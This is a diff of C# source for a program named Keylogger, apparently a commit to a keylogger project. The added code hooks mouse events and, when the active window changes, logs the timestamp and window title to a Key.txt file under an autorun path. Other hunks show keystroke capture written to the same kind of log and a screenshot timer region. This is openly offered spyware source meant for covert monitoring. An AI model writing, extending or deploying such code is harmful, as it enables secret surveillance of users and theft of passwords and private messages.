@@ -10,11 +10,6 @@ using System.Linq;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Forms;
-using System.Windows.Input;
-using Application = System.Windows.Application;
-using MessageBox = System.Windows.MessageBox;
-using MouseEventArgs = System.Windows.Forms.MouseEventArgs;
 
 
 namespace Keylogger
@@ -86,17 +81,26 @@ namespace Keylogger
                 }
             });
 
+            MouseHook.Start();
+            MouseHook.MouseAction += new EventHandler(MouseEvent);
+
         }
 
-       static string winTitle = String.Empty;
+        private void MouseEvent(object sender, EventArgs e)
+        {
+            if (IsWindowChanged())
+            {
+                StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true);
+                datatime = DateTime.Now.ToString();
+                SW.WriteLine();
+                SW.WriteLine(datatime + "\t" + winTitle);
+                SW.Close();
+            }
+        }
 
-        //private void button1_MouseDown(object sender, MouseEventArgs e)
-        //{
-        //    if (MouseButtons.Left)
-        //    {
-        //        MessageBox.Show("Вы нажали Левую кнопку, координаты курсора - " );
-        //    }
-        //}
+        static string winTitle = String.Empty;
+
+        #region WINDOW_Activity
 
         public static string GetActiveWindow()
         {
@@ -112,14 +116,13 @@ namespace Keylogger
         public static bool IsWindowChanged()
         {
 
-            string wTitle = GetActiveWindow();
-
-            // проверяем 
+            string wTitle = GetActiveWindow();// проверяем 
             bool res = wTitle != winTitle;
-
             winTitle = wTitle; // записываем активное кно на хранения для следующего сравнения
             return res; // и возвращаем результат comments
         }
+
+        #endregion
 
         #region KEY_WRITE
 
@@ -266,6 +269,8 @@ namespace Keylogger
                         SW.Write("+");
                     if (e.KeyCode == System.Windows.Forms.Keys.Subtract)
                         SW.Write("-");
+                    if (e.KeyCode == System.Windows.Forms.Keys.D1)
+                        SW.Write("-");
                     else
                     {
                         SW.Write("");
@@ -381,7 +386,7 @@ namespace Keylogger
 
         #endregion
         
-        #region Timer
+        #region ScreenShotTimer
 
         private int time = 0;
         private void timer_tick(object sender, EventArgs e)
